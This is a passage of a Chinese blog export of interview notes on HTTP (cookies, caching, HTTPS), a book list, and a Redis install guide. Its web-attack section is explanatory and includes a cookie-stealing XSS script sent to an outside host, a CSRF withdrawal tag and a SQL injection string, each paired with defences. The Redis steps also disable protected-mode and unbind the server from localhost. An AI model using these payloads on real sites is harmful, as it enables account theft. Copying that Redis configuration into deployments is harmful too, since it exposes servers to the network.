Path=/docs，则以下地址都会匹配： /docs /docs/Web/ /docs/Web/HTTP 7. Session除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。 Session 可以存储在服务器上的文件、数据库或者内存中，现在最常见的是将 Session 存储在内存型数据库中，比如 Redis。 使用 Session 维护用户登录的过程如下： 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码； 如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作。 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。 8. 浏览器禁用 Cookie此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。 9. Cookie 与 Session 选择 Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。 缓存1. 优点 缓解服务器压力； 降低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。 2. 实现方法 让代理服务器进行缓存； 让客户端浏览器进行缓存。 3. Cache-ControlHTTP/1.1 通过 Cache-Control 首部字段来控制缓存。 （一）禁止进行缓存 no-store 指令规定不能对请求或响应的任何一部分进行缓存。 1Cache-Control: no-store （二）强制确认缓存 no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。 1Cache-Control: no-cache （三）私有缓存和公共缓存 private 指令规定了将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。 1Cache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户所使用，一般存储在代理服务器中。 1Cache-Control: public （四）缓存过期机制 max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 max-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。 1Cache-Control: max-age=31536000 Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。 1Expires: Wed, 04 Jul 2012 08:26:05 GMT 4. 缓存验证需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。 1ETag: "82e22293907ce725faf67773957acd12" 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。 1If-None-Match: "82e22293907ce725faf67773957acd12" Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应， 1Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT 1If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 连接管理 1. 短连接与长连接当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。 2. 流水线默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。 流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。 内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 1. 类型（一）服务端驱动型内容协商 客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。 它存在以下问题： 服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。 （二）代理驱动型协商 服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。 2. Vary1Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。 例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。 内容编码内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。 浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中，Vary 首部中至少要包含 Content-Encoding，这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。 范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。 1. Range在请求报文中添加 Range 首部字段指定请求的范围。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 2. Accept-Ranges响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。 1Accept-Ranges: bytes 3. 响应状态码 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。 分块传输编码Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。 多部分对象集合一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 虚拟主机HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。 通信数据转发1. 代理代理服务器接受客户端的请求，并且转发给其它服务器。 使用代理的主要目的是： 缓存 负载均衡 网络访问控制 访问日志记录 代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 2. 网关与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。 3. 隧道使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。 六、HTTPsHTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。 通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。 加密1. 对称密钥加密对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。 优点：运算速度快； 缺点：无法安全地将密钥传输给通信方。 2.非对称密钥加密非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。 公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。 优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。 3. HTTPs 采用的加密方式HTTPs 采用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥） 认证通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。 服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。 通信开始时，客户端需要使用服务器的公开密钥将自己的私有密钥传输给服务器，之后再进行对称密钥加密。 完整性保护SSL 提供报文摘要功能来进行完整性保护。 HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。 HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。 HTTPs 的缺点 因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高费用。 配置 HTTPsNginx 配置 HTTPS 服务器 七、Web 攻击技术跨站脚本攻击1. 概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。 例如有一个论坛网站，攻击者可以在上面发布以下内容： 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式： 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 2. 危害 窃取用户的 Cookie 值 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 3. 防范手段（一）设置 Cookie 为 HttpOnly 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。 （二）过滤特殊字符 例如将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。 （三）富文本编辑器的处理 富文本编辑器允许用户输入 HTML 代码，就不能简单地将 &lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。 富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。 以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。 XSS 过滤在线测试 1234567891011121314151617181920212223242526&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;p class="text-center"&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&lt;form&gt; &lt;input type="text" name="q" value="test"&gt; &lt;button id="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt; 1234567891011121314151617181920212223242526&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&amp;lt;form&amp;gt; &amp;lt;input type="text" name="q" value="test"&amp;gt; &amp;lt;button id="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&amp;lt;script type="text/javascript"&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt; 跨站请求伪造1. 概念跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。 假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 2. 防范手段（一）检查 Referer 首部字段 Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 XSRF 攻击。 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 （二）添加校验 Token 在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。 （三）输入验证码 因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。 也可以要求用户输入验证码来进行校验。 SQL 注入攻击1. 概念服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。 2. 攻击原理例如一个网站登录验证的 SQL 查询代码为： 1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');" 如果填入以下内容： 12userName = "1' OR '1'='1";passWord = "1' OR '1'='1"; 那么 SQL 查询字符串为： 1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');" 此时无需验证通过就能执行以下查询： 1strSQL = "SELECT * FROM users;" 3. 防范手段（一）使用参数化查询 以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。 1234PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery(); （二）单引号转换 将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。 拒绝服务攻击拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。 维基百科：拒绝服务攻击 八、GET 和 POST 的区别作用GET 用于获取资源，而 POST 用于传输实体主体。 参数GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。 因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码，例如中文会转换为%E4%B8%AD%E6%96%87，而空格会转换为%20。POST 支持标准字符集。 安全安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 幂等性幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。 GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1 -&gt; Adds a 1nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便不同的请求接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 可缓存如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。而 GET 方法 Header 和 Data 会一起发送。 九、HTTP/1.0 与 HTTP/1.1 的区别 详细内容请见上文 HTTP/1.1 默认是长连接 HTTP/1.1 支持管线化处理 HTTP/1.1 支持同时打开多个 TCP 连接 HTTP/1.1 支持虚拟主机 HTTP/1.1 新增状态码 100 HTTP/1.1 支持分块传输编码 HTTP/1.1 新增缓存处理指令 max-age 十、HTTP/2.0HTTP/1.x 缺陷 HTTP/1.x 实现简单是以牺牲应用性能为代价的： 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。 在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 服务端推送HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。 参考资料 上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014. MDN : HTTP HTTP/2 简介 htmlspecialchars How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement 浅谈 HTTP 中 Get 与 Post 的区别 Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY &amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie 与 Session 的区别 COOKIE 和 SESSION 有什么区别 Cookie/Session 的机制与安全 HTTPS 证书原理 维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击 What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption – What are differences? Web 性能优化与 HTTP/2 HTTP/2 简介]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BOOKLIST]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FBOOKLIST%2F</url>
    <content type="text"><![CDATA[数据结构与算法 算法 数据结构与算法分析 编程珠玑 剑指 Offer 操作系统 现代操作系统 深入理解计算机系统 鸟哥的 Linux 私房菜 Unix 环境高级编程 Unix/Linux 编程实践教程 计算机网络 计算机网络 计算机网络 自顶向下方法 图解 HTTP TCP/IP 详解 卷 1：协议 UNIX 网络编程 Linux 多线程服务端编程 面向对象 Head First 设计模式 设计模式 可复用面向对象软件的基础 敏捷软件开发 原则、模式与实践 数据库 数据库系统概念 MySQL 必知必会 高性能 MySQL Redis 设计与实现 Redis 实战 Java Java 编程思想 Effective java 中文版 深入理解 Java 虚拟机 Java 并发编程实战 精通 Spring 4.x Spring 揭秘 C++ C++ Primer Effective C++ C++ 编程规范 STL 源码剖析 深度探索 C++ 对象模型 网站架构/分布式 大规模分布式存储系统 从 Paxos 到 Zookeeper 大型网站系统与 Java 中间件开发实践 淘宝技术这十年 深入理解 Nginx 开发工具 Pro Git 正则表达式必知必会 编码实践 重构 代码大全 人月神话 程序员的职业素养 编写可读代码的艺术 其它 JavaScript 语言精粹 利用 Python 进行数据分析 概率论与数理统计]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2018%2F07%2F03%2FHadoop%2F8_Redis%2FRedis%2F</url>
    <content type="text"><![CDATA[1.安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192931. 下载2. tar3. cd redis-3.xxxx/deps4. make geohash-int hiredis jemalloc linenoise lua-----------------5. cd .. 退回到 redis 根目录$redis-3.xxxx&gt; make test 等待几分钟, 等待编译完成会出现 `编译完成没有错误`的英文... 然后直接 make 6. 接下来就是执行 make install 安装了启动等脚本了 默认会自动安装到 /usr/local/binmake 后面跟上 PREFIX=path 可以自己指定安装路径这里安装到 ~/apps/ 下的 redis 目录中$&gt; sudo make PREFIX=/home/ap/apps/redis install7. # 复制配置文件到redis安装目录$redis-3.xxxx&gt; sudo cp redis.conf /home/ap/apps/redis&gt; vi redis.conf-------------------------# 修改 redis-server 后台启动(也可以不配, 用 nohup的方式后台启动)daemonize yes# 修改 protected-mode 为 noprotected-mode no# 注释掉 bind 本机端口# bind 127.0.0.1 ::1# 配置环境变量export REDIS_HOME=/home/ap/apps/redisexport PATH=$PATH:$REDIS_HOME/bin# 把环境变量 .zshrc 和 存有 sh 命令的 redis 安装目录发送到其它机器# source 要使用机器的 .zshrc配置8.  启动试试看~# 如果配置了后台启动, 并且加载了配置文件的话就不会出现以下图形了 $&gt; redis-server ~/apps/redis/redis.conf 也可以直接 $&gt; redis-server 这样就不会加载配置文件, 会出现下面的.. _._ _.-``__ ''-._ _.-`` `. `_. ''-._ Redis 4.0.10 (00000000/0) 64 bit .-`` .-```. ```\/ _.,_ ''-._ ( ' , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|'` _.-'| Port: 6379 | `-._ `._ / _.-' | PID: 1034 `-._ `-._ `-./ _.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | http://redis.io `-._ `-._`-.__.-'_.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | `-._ `-._`-.__.-'_.-' _.-' `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'出现一个这个吊的图像, 就说明启动成功了.....# 也可以这样后台启动, 带 lognohup &lt;sub&gt;/apps/redis/bin/redis-server &lt;/sub&gt;/apps/redis/redis.conf 1&gt;&lt;sub&gt;/logs/redis_log/redis_std.log 2&gt;&lt;/sub&gt;/logs/redis_log/redis_error.log &amp;7、启动客户端，执行命令：[hadoop@hadoop02 ~]$ redis-cli#  查看是否有进程ps -ef | grep redis --------[ap@cs1]~% ps -ef | grep redisap 36260 35955 0 14:11 pts/3 00:00:00 redis-server *:6379ap 36287 36267 0 14:11 pts/5 00:00:00 grep redis&gt;&gt; 最开始的 36260 就是 pid9.  连接# redis/bin/redis-cli [-h localhost -p 6379 ]# 如果是本机启动客户端$&gt; redis-cli# 如果是从其他节点上链接 redis，那么可以这么做：$cs2&gt; redis-cli -h cs1 -p 6379cs1:6379&gt; pingPONG10. 停止服务cli端: shutdown save|nosave 2.Redis 注意点REmote DIctionary Server(Redis)Redis 常被称作是一款 key-value 内 存存储系统或者内存数据库，同时由于它支持丰富的数据结构，又被称为一种数据结构服务 器（Data Structure Server）。 因为值（value）可以是字符串(String)，哈希(Map)，列表(list)， 集合(sets)和有序集合(sorted sets)等类型。 与其他 key-value 缓存产品比较独有特点1、Redis 支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载 进行使用。 2、Redis 不仅仅支持简单的 key-value 类型的数据，同时还提供 list，set，zset，hash 等数据 结构的存储。 3、Redis 支持数据的备份，即 master-slave 模式的数据备份。 Redis优势1、性能极高：Redis 能读的速度是 110000 次/s，写的速度是 81000 次/s 。 2、丰富的数据类型：Redis 支持二进制案例的 String, List, Hash, Set 及 Sorted Set 数据类型操 作。 3、原子操作：Redis 的所有操作都是原子性的，同时 Redis 还支持对几个操作全并后的原子 性执行。 4、丰富的特性：Redis 还支持 Publish/Subscribe，通知 key 过期，支持高可用集群等等特性。 5、数据持久化机制 持久化机制有两种：1、RDB 方式：定期将内存数据 dump 到磁盘 2、AOF(append only file)持久化机制：用记日志的方式记录每一条数据更新操作，一旦 出现灾难事件，可以通过日志重放来恢复整个数据库 Redis适用场景1、TopN 需求：取最新的 n 个数据，如读取作家博客最新的 50 篇文章，通过 List 实现按时 间排序的数据的高效获取 2、排行榜应用：以特定条件为排序标准，将其设成 sorted set 的 score，进而实现高效获取 3、需要精准设定过期时间的应用：把 sorted set 的 score 值设置成过期时间的时间戳，那么 就可以简单地通过过期时间排序，定时清除过期数据了 4、计数器应用：Redis 的命令都是原子性的，可以轻松地利用 INCR，DECR 命令来构建计数 器系统。 5、去除大量数据中的重复数据：将数据放入 set 中，就能实现对重复数据的排除 6、构建队列系统：使用 list 可以构建队列系统，使用 sorted set 甚至可以构建有优先级的队 列系统。 7、实时系统，反垃圾系统：通过上面说到的 set 功能，你可以知道一个终端用户是否进行 了某个操作，可以找到其操作的集合并进行分析统计对比等。 8、Publish/SubScribe 构建实时消息系统 9、缓存（会话，商品列表，评论列表，经常查询的数据等） 3.Redis基本操作具体见文档 也可以查询网站 